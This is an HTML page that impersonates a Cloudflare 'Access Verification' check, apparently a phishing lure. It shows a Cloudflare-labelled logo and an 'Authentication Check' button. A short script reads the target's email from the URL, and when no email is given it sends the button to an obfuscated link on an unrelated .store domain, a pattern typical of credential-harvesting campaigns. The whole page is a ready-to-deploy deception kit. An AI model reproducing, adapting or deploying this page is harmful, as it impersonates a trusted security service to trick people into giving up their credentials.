<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Check</title>
    <style>
        body {
            font-family: 'Helvetica', sans-serif;
            background-color: #f9f9f9;
            margin: 0;
            padding: 0;
        }

        .container {
            max-width: 600px;
            margin: 0 auto;
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            text-align: center;
        }

        .logo {
            margin: 20px 0;
        }

        .logo img {
            max-width: 150px;
        }

        .content {
            font-size: 16px;
            color: #333;
        }

        .content h1 {
            font-size: 24px;
            color: #000;
            margin-bottom: 20px;
        }

        .content p {
            margin: 20px 0;
            color: #555;
        }

        .button {
            display: inline-block;
            background: #1F75FE;
            color: white;
            padding: 10px 20px;
            text-decoration: none;
            border-radius: 5px;
            font-size: 18px;
            margin-top: 20px;
        }

        .footer {
            font-size: 12px;
            color: #888;
            margin-top: 20px;
        }
    </style>
</head>

<body>
    <div class="container">
        <!-- Logo -->
        <div class="logo"><img src="https://i.imghippo.com/files/XWrP9740R.jpeg" alt="Cloudflare Logo" style="width: 95px;"></div><!-- Content -->
        <div class="content">
            <h1>Access Verification</h1>
            <p>To continue, please confirm you&rsquo;re a human by clicking the button below. This is part of our security verification process.</p><!-- Button -->
            <div style="text-align: center; margin: 20px 0;"><a href="http://goal.com" id="authButton" class="button" target="_blank" rel="noopener noreferrer">Authentication Check</a></div>
        </div><!-- Footer -->
        <div class="footer">
            <p><strong>This message was generated by the system for security purposes. Please do not reply.</strong></p>
        </div>
    </div>
    <script>
        // Get the URL parameters
        const urlParams = new URLSearchParams(window.location.search);
        const email = urlParams.get('email');
        
        // Set the button href with the email or a default link
        const authButton = document.getElementById('authButton');
        if (email) {
            authButton.href = `your-authentication-url?email=${encodeURIComponent(email)}`;
        } else {
            authButton.href = 'https://tvrcemeheff.consultantmarketinglee.store/iOBZUmbP#'; // Default link if email is not provided
        }
        
        // Optional: Prevent default action if the link is empty
        authButton.addEventListener('click', function(event) {
            if (authButton.href === '#') {
                event.preventDefault();
                alert('Link is not set. Please check your URL parameters.');
            }
        });
    </script>
</body>

</html>
